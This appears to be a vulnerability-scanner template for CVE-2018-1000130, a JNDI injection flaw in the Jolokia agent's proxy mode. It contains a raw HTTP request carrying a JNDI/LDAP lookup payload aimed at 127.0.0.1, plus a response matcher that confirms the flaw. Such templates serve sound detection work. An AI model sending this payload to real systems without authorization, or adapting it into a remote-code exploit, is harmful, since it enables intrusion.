id: CVE-2018-1000130
info:
  author: milo2012
  classification:
    cve-id: CVE-2018-1000130
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cwe-id: CWE-74
  description: A JNDI Injection vulnerability exists in Jolokia agent in the proxy
    mode that allows a remote attacker to run arbitrary Java code on the server.
  name: Jolokia Agent Proxy JNDI Code Injection
  reference:
  - https://jolokia.org/#Security_fixes_with_1.5.0
  - https://access.redhat.com/errata/RHSA-2018:2669
  severity: high
  tags: cve,cve2018,jolokia,rce,jndi,proxy
requests:
- matchers:
  - part: body
    type: word
    words:
    - 'Failed to retrieve RMIServer stub: javax.naming.CommunicationException: 127.0.0.1:1389'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /jolokia/read/getDiagnosticOptions HTTP/1.1\nHost: {{Hostname}}\nAccept:\
    \ text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.\n\
    Content-Type: application/x-www-form-urlencoded\n\n{\n   \"type\":\"read\",\n\
    \   \"mbean\":\"java.lang:type=Memory\",\n   \"target\":{\n      \"url\":\"service:jmx:rmi:///jndi/ldap://127.0.0.1:1389/o=tomcat\"\
    \n   }\n}\n"
